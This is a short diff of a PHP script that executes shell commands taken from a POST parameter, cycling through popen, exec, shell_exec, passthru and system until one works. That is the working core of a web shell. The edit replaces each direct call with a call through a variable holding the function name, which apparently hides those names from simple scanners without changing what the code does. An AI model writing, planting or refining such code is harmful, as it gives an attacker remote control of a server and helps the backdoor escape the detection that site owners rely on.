@@ -88,22 +88,22 @@
     if($execute) {
         if(function_exists("popen")) {
             $exec_func = "popen";
-            $handle = popen($_POST["cmd"], "r");
+            $handle = $exec_func($_POST["cmd"], "r");
             echo htmlspecialchars(stream_get_contents($handle));
             $exit_code = pclose($handle);
         } else if(function_exists("exec")) {
             $exec_func = "exec";
-            exec($_POST["cmd"], $output, $exit_code);
+            $exec_func($_POST["cmd"], $output, $exit_code);
             echo htmlspecialchars(implode("\n", $output));
         } else if(function_exists("shell_exec")) {
             $exec_func = "shell_exec";
-            echo htmlspecialchars(shell_exec($_POST["cmd"]));
+            echo htmlspecialchars($exec_func($_POST["cmd"]));
         } else if(function_exists("passthru")) {
             $exec_func = "passthru";
-            passthru($_POST["cmd"], $exit_code);
+            $exec_func($_POST["cmd"], $exit_code);
         } else if(function_exists("system")) {
             $exec_func = "system";
-            system($_POST["cmd"], $exit_code);
+            $exec_func($_POST["cmd"], $exit_code);
         } else {
             echo "Error - All of the following execution functions have been disabled in PHP:\n";
             echo "popen\nexec\nshell_exec\npassthru\nsystem\n";
